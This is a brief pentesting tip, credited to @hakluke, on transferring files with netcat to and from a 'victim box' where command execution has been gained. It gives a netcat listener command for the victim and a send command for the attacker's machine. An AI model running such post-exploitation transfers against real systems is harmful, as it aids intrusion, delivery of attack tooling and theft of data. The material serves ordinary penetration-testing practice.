# How to transfer a file using netcat

This can be useful to get files to and from a host where you have gained command execution.

On the victim box:

    nc -nvlp 55555 > file

On your box:

    nc $victimip 55555 < file

Source:

    - [@hakluke](https://twitter.com/hakluke)


